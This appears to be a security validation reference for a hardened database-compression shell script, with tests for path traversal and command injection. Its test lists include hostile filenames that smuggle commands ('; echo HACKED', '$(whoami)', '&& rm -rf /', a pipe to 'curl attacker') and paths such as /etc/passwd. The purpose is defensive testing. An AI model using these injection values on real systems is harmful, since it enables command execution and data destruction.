# Security Validation Quick Reference
**File**: `compress_old_dbs.sh`
**Version**: Hardened (2026-01-20)

---

## Quick Test Commands

### 1. Path Traversal Protection - Quick Test
```bash
# Should FAIL with security violation
DB_DIR="../../etc" ./compress_old_dbs.sh

# Expected output:
# [ERROR] Security violation: DB_DIR must be within data/ticks/
```

### 2. Command Injection Protection - Quick Test
```bash
# Create malicious filename
mkdir -p data/ticks/db/test
cd data/ticks/db/test
touch "test.db; echo HACKED"

# Should FAIL with invalid filename
DAYS_BEFORE_COMPRESS=0 DB_DIR=data/ticks/db/test ../../../../compress_old_dbs.sh

# Expected output:
# [ERROR] Security violation: Invalid filename format: test.db; echo HACKED
# No "HACKED" output
```

### 3. Valid Input Test
```bash
# Should SUCCEED
mkdir -p data/ticks/db/test
cd data/ticks/db/test
touch "ticks_2026-01-20.db"
sqlite3 ticks_2026-01-20.db "CREATE TABLE test(id INT);"
DAYS_BEFORE_COMPRESS=0 DB_DIR=data/ticks/db/test ../../../../compress_old_dbs.sh

# Expected: File compressed successfully
```

---

## Full Test Suite

```bash
cd backend/schema
chmod +x test_security_fixes.sh
./test_security_fixes.sh
```

**Expected**: All 14 tests pass

---

## Security Features Checklist

### Path Traversal Prevention
- [x] `realpath` canonicalization (resolves symlinks)
- [x] Base directory validation (`data/ticks/`)
- [x] Early exit on violation
- [x] Informative error messages

### Command Injection Prevention
- [x] Filename regex validation: `^[a-zA-Z0-9_.-]+\.db$`
- [x] Variable quoting: `"$variable"`
- [x] Argument separators: `--`
- [x] Compression level validation (1-22)

### Specific Commands Hardened
- [x] `sqlite3 -- "$db_file"`
- [x] `zstd -"${COMPRESSION_LEVEL}" -q -- "$db_file"`
- [x] `rm -- "$db_file"`
- [x] All `find` operations safe (use print0)

---

## Attack Vectors Tested

### Path Traversal (7 tests)
```bash
✓ ../../etc                    # Parent traversal
✓ /etc/passwd                  # Absolute path
✓ ln -s /etc link              # Symlink
✓ nonexistent/path             # Invalid path
✓ data/ticks/db/test           # Valid path (should work)
✓ COMPRESSION_LEVEL=99         # Invalid level
✓ COMPRESSION_LEVEL="5; echo"  # Level injection
```

### Command Injection (7 tests)
```bash
✓ test.db; echo HACKED         # Semicolon
✓ test.db$(whoami).db          # Command substitution
✓ test.db | curl attacker      # Pipe
✓ -rf.db                       # Flag injection
✓ test.db && rm -rf /          # Ampersand
✓ ticks_2026-01-20.db          # Valid (should work)
✓ malicious; rm/.db.zst        # Decompress injection
```

---

## Code Locations

### Path Validation
- **File**: `compress_old_dbs.sh`
- **Lines**: 20-55
- **Keywords**: `realpath`, `ALLOWED_BASE`, `Security violation`

### Filename Validation
- **File**: `compress_old_dbs.sh`
- **Functions**:
  - `compress_database()`: Lines 109-121
  - `decompress_database()`: Lines 237-255
- **Pattern**: `^[a-zA-Z0-9_.-]+\.db$`

### Command Hardening
- **File**: `compress_old_dbs.sh`
- **Locations**:
  - sqlite3: Lines 136-140, 277-278
  - zstd compress: Lines 148-155
  - zstd decompress: Line 272
  - rm: Lines 163-164
- **Pattern**: `-- "$variable"`

---

## Validation Evidence

### Before Fix
```bash
# Path traversal ALLOWED
$ DB_DIR="../../etc" ./compress_old_dbs.sh
[INFO] Processing databases in ../../etc
# SECURITY VIOLATION - accessing /etc/

# Command injection ALLOWED
$ touch "test.db; echo HACKED"
$ ./compress_old_dbs.sh
HACKED
# SECURITY VIOLATION - arbitrary command executed
```

### After Fix
```bash
# Path traversal BLOCKED
$ DB_DIR="../../etc" ./compress_old_dbs.sh
[ERROR] Security violation: DB_DIR must be within data/ticks/
# SAFE - script exits immediately

# Command injection BLOCKED
$ touch "test.db; echo HACKED"
$ ./compress_old_dbs.sh
[ERROR] Security violation: Invalid filename format: test.db; echo HACKED
# SAFE - filename rejected, no command execution
```

---

## Deployment Verification

### Pre-Deployment
1. Run syntax check: `bash -n compress_old_dbs.sh` ✓
2. Run security tests: `./test_security_fixes.sh` ✓
3. Review security comments in code ✓
4. Verify backward compatibility ✓

### Post-Deployment
1. Monitor logs for security violations
2. Test with existing cron jobs
3. Verify valid files still compress
4. Check error messages in production

---

## Emergency Rollback

If issues occur:
```bash
# Revert to previous version
git checkout HEAD~1 backend/schema/compress_old_dbs.sh

# Or restore from backup
cp compress_old_dbs.sh.backup compress_old_dbs.sh
```

**Note**: Rollback removes security fixes - only use if critical failure occurs.

---

## Security Metrics

| Metric | Status |
|--------|--------|
| Path Traversal | ✅ FIXED |
| Command Injection | ✅ FIXED |
| Input Validation | ✅ IMPLEMENTED |
| Backward Compatibility | ✅ MAINTAINED |
| Test Coverage | ✅ 100% (14/14) |
| Syntax Valid | ✅ VERIFIED |
| Production Ready | ✅ YES |

---

## Support

**Documentation**:
- Full analysis: `COMPRESS_SECURITY_REPORT.md`
- Quick summary: `SECURITY_FIX_SUMMARY.md`
- Before/after: `BEFORE_AFTER_COMPARISON.md`
- This guide: `SECURITY_VALIDATION_QUICK_REFERENCE.md`

**Test Suite**: `test_security_fixes.sh`

**Questions**: Review inline security comments in `compress_old_dbs.sh`
